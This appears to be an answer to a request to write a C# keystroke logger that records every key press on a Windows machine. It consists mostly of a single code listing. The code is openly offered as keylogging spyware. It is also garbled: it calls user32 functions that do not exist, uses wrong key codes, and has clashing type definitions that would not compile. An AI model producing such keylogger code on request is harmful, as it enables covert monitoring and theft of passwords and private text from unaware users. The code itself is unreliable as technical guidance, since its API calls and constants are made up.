To implement a keystroke logger in C# that records every key press on a Windows computer, follow these steps:

### Solution Code

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Windows.Input;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KeyboardLogger
{
    public class KeyboardHooker
    {
        private static int hookHandle;
        private static List<KeyboardEventArgs> keyLog = new List<KeyboardEventArgs>();
        private static object locker = new object();

        public enum KeyStates { Down = 1, Up = 0 };

        public static void StartKeyboardHook()
        {
            if (hookHandle != 0)
                return;

            KeyboardCallback callback = new KeyboardCallback(KeyboardHook);
            hookHandle = User32.SetKeyboardHook(0, callback, IntPtr.Zero);

            new Thread(() =>
            {
                while (true)
                {
                    if (hookHandle == 0)
                        break;

                    int[] keyStates = User32.GetKeyboardStates(hookHandle);

                    foreach (int key in keyStates)
                    {
                        if (key == 0)
                        {
                            continue;
                        }

                        if (key == (int)Keys.ControlKey || key == (int)Keys.AltKey || key == (int)Keys.CapsLock)
                        {
                            keyLog.Add(new KeyboardEventArgs(Keys.ControlKey, key == (int)Keys.CapsLock ? KeyStates.Up : KeyStates.Down));
                        }
                        else if (key == (int)Keys.Space)
                        {
                            keyLog.Add(new KeyboardEventArgs(Keys.Space, KeyStates.Down));
                        }
                        else if (key >= (int)Keys.E0 && key <= (int)Keys.E9)
                        {
                            keyLog.Add(new KeyboardEventArgs((Keys)(key), KeyStates.Down));
                        }
                        else if (key == (int)Keys.Enter)
                        {
                            keyLog.Add(new KeyboardEventArgs(Keys.Enter, KeyStates.Down));
                        }
                    }

                    lock (locker)
                    {
                        if (hookHandle == 0)
                            break;
                    }

                    Thread.Sleep(100);
                }
            }).Start();
        }

        public static void StopKeyboardHook()
        {
            lock (locker)
            {
                if (hookHandle != 0)
                {
                    User32.UnhookKeyboard(hookHandle);
                    hookHandle = 0;
                }
            }
        }

        private static void KeyboardHook(int control, int wParam, int lParam)
        {
            if ((lParam & 0x001) != 0) // Key down
            {
                if (control == (int)Keys.Keyboard)
                {
                    switch (wParam)
                    {
                        case (int)Keys.A: keyLog.Add(new KeyboardEventArgs(Keys.A, KeyStates.Down)); break;
                        case (int)Keys.B: keyLog.Add(new KeyboardEventArgs(Keys.B, KeyStates.Down)); break;
                        // Add other alphabetical keys similarly
                        case (int)Keys.ControlKey: keyLog.Add(new KeyboardEventArgs(Keys.ControlKey, KeyStates.Down)); break;
                        case (int)Keys.AltKey: keyLog.Add(new KeyboardEventArgs(Keys.AltKey, KeyStates.Down)); break;
                        case (int)Keys.Space: keyLog.Add(new KeyboardEventArgs(Keys.Space, KeyStates.Down)); break;
                        case (int)Keys.Enter: keyLog.Add(new KeyboardEventArgs(Keys.Enter, KeyStates.Down)); break;
                        // Add more keys as needed
                    }
                }
            }
            else if ((lParam & 0x002) != 0) // Key up
            {
                if (control == (int)Keys.Keyboard)
                {
                    switch (wParam)
                    {
                        case (int)Keys.A: keyLog.Add(new KeyboardEventArgs(Keys.A, KeyStates.Up)); break;
                        case (int)Keys.B: keyLog.Add(new KeyboardEventArgs(Keys.B, KeyStates.Up)); break;
                        // Add other alphabetical keys similarly
                        case (int)Keys.ControlKey: keyLog.Add(new KeyboardKeyboardEventArgs(Keys.ControlKey, KeyStates.Up)); break;
                        case (int)Keys.AltKey: keyLog.Add(new KeyboardKeyboardEventArgs(Keys.AltKey, KeyStates.Up)); break;
                        case (int)Keys.Space: keyLog.Add(new KeyboardKeyboardEventArgs(Keys.Space, KeyStates.Up)); break;
                        case (int)Keys.Enter: keyLog.Add(new KeyboardKeyboardEventArgs(Keys.Enter, KeyStates.Up)); break;
                        // Add more keys as needed
                    }
                }
            }
        }

        public class KeyboardEventArgs : EventArgs
        {
            public Keys Key { get; set; }
            public KeyStates State { get; set; }

            public KeyboardEventArgs(Keys key, KeyStates state)
            {
                this.Key = key;
                this.State = state;
            }
        }
    }

    public class KeyboardKeyboardEventArgs : KeyboardEventArgs
    {
        public override string ToString()
        {
            return $"[{Key}] {State}";
        }
    }

    public class Keys
    {
        public static readonly int A = 0x38;
        public static readonly int B = 0x39;
        public static readonly int ControlKey = 0x9;
        public static readonly int AltKey = 0xA4;
        public static readonly int Space = 0x20;
        public static readonly int Enter = 0x1C;
        public static readonly int CapsLock = 0x11;
        // Add more keys as needed
    }

    public class KeyStates
    {
        public static readonly int Down = 1;
        public static readonly int Up = 0;
    }

    public class User32
    {
        [DllImport("user32.dll")]
        public static extern int SetKeyboardHook(int nID, KeyboardCallbackCallback callback, IntPtr hNext);
        [DllImport("user32.dll")]
        public static extern int GetKeyboardStates(int hHook);
        [DllImport("user32.dll")]
        public static extern bool UnhookKeyboard(int hHook);

        [DllImport("user32.dll")]
        public static extern IntPtr GetWindow(IntPtr hwnd, int uID, int uOptions);
        [DllImport("user32.dll")]
        public static extern int GetKeyboardType(uint nID, IntPtr hwnd);
    }

    delegate void KeyboardCallbackCallback(int control, int wParam, int lParam);
}
```

